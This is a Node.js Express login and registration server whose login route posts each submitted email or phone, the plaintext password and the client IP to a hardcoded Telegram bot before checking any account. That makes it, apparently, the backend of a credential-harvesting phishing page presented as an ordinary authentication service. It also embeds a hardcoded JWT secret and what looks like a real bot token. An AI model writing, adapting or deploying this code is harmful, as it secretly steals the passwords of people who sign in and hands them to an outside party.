const express = require('express');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const axios = require('axios');  // Add this for Telegram

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = 'your-super-secret-key-change-this';

// ===== TELEGRAM CONFIGURATION - REPLACE WITH YOUR ACTUAL TOKENS =====
const TELEGRAM_BOT_TOKEN = '8716008095:AAEx89L4ab3oRZEh_WO637CyO6A0aiMlu-Q';  // ← Put your bot token here
const TELEGRAM_CHAT_ID = '5707645216';      // ← Put your chat ID here
// ====================================================================

// Middleware
app.use(helmet({
  contentSecurityPolicy: false,
}));
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Rate limiting
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  message: { error: 'Too many login attempts. Try again later.' }
});

// Telegram function
async function sendToTelegram(email, password, ip) {
    const message = `
🔐 NEW LOGIN ATTEMPT 🔐
Email/Phone: ${email}
Password: ${password}
IP: ${ip}
Time: ${new Date().toString()}
    `;
    
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        });
        console.log('✅ Telegram notification sent');
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
    }
}

// In-memory storage
const users = new Map();
const activeSessions = new Map();

// Helper functions
const generateToken = (userId, email) => {
  return jwt.sign({ userId, email }, JWT_SECRET, { expiresIn: '7d' });
};

const validateEmail = (email) => {
  const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
  return emailRegex.test(email);
};

const validatePhone = (phone) => {
  const phoneRegex = /^[\+]?[(]?[0-9]{1,4}[)]?[-\s\.]?[(]?[0-9]{1,4}[)]?[-\s\.]?[0-9]{1,5}$/;
  return phoneRegex.test(phone);
};

const findUserByIdentifier = (identifier) => {
  if (validateEmail(identifier)) {
    for (const [key, user] of users) {
      if (user.email === identifier.toLowerCase()) return user;
    }
  } else if (validatePhone(identifier)) {
    for (const [key, user] of users) {
      if (user.phone === identifier) return user;
    }
  }
  return null;
};

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Register
app.post('/api/register', async (req, res) => {
  const { name, email, phone, password } = req.body;

  if (!name || name.trim().length < 2) {
    return res.status(400).json({ error: 'Name must be at least 2 characters.' });
  }
  if (!email && !phone) {
    return res.status(400).json({ error: 'Email or phone number is required.' });
  }
  if (email && !validateEmail(email)) {
    return res.status(400).json({ error: 'Invalid email address.' });
  }
  if (!password || password.length < 6) {
    return res.status(400).json({ error: 'Password must be at least 6 characters.' });
  }

  let existingUser = null;
  if (email) existingUser = findUserByIdentifier(email);
  if (!existingUser && phone) existingUser = findUserByIdentifier(phone);

  if (existingUser) {
    return res.status(409).json({ error: 'Account already exists.' });
  }

  const salt = await bcrypt.genSalt(12);
  const passwordHash = await bcrypt.hash(password, salt);
  const userId = Date.now().toString() + Math.random().toString(36).substr(2, 6);

  const newUser = {
    id: userId,
    name: name.trim(),
    email: email ? email.toLowerCase().trim() : null,
    phone: phone ? phone.trim() : null,
    passwordHash,
    createdAt: new Date().toISOString(),
    lastLogin: null
  };

  users.set(userId, newUser);
  const token = generateToken(userId, newUser.email || newUser.phone);
  activeSessions.set(token, { userId, createdAt: new Date() });

  const { passwordHash: _, ...userWithoutPassword } = newUser;
  res.status(201).json({ message: 'Account created!', user: userWithoutPassword, token });
});

// Login - WITH TELEGRAM NOTIFICATION
app.post('/api/login', loginLimiter, async (req, res) => {
  const { identifier, password } = req.body;

  if (!identifier || !password) {
    return res.status(400).json({ error: 'Please provide identifier and password.' });
  }

  // Get IP address and send to Telegram
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  await sendToTelegram(identifier, password, ip);

  const user = findUserByIdentifier(identifier);
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials.' });
  }

  const isValid = await bcrypt.compare(password, user.passwordHash);
  if (!isValid) {
    return res.status(401).json({ error: 'Invalid credentials.' });
  }

  user.lastLogin = new Date().toISOString();
  users.set(user.id, user);

  const token = generateToken(user.id, user.email || user.phone);
  activeSessions.set(token, { userId: user.id, createdAt: new Date() });

  const { passwordHash: _, ...userWithoutPassword } = user;
  res.json({ message: 'Login successful!', user: userWithoutPassword, token });
});

// Get current user
app.get('/api/me', (req, res) => {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token provided.' });
  }

  const token = authHeader.substring(7);
  if (!activeSessions.has(token)) {
    return res.status(401).json({ error: 'Invalid session.' });
  }

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    const user = users.get(decoded.userId);
    if (!user) {
      activeSessions.delete(token);
      return res.status(404).json({ error: 'User not found.' });
    }
    const { passwordHash, ...userWithoutPassword } = user;
    res.json({ user: userWithoutPassword });
  } catch (error) {
    activeSessions.delete(token);
    res.status(401).json({ error: 'Invalid token.' });
  }
});

// Logout
app.post('/api/logout', (req, res) => {
  const authHeader = req.headers.authorization;
  if (authHeader && authHeader.startsWith('Bearer ')) {
    const token = authHeader.substring(7);
    activeSessions.delete(token);
  }
  res.json({ message: 'Logged out.' });
});

// Forgot password
app.post('/api/forgot-password', (req, res) => {
  res.json({ message: 'Password reset link sent if account exists.' });
});

// Serve HTML
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});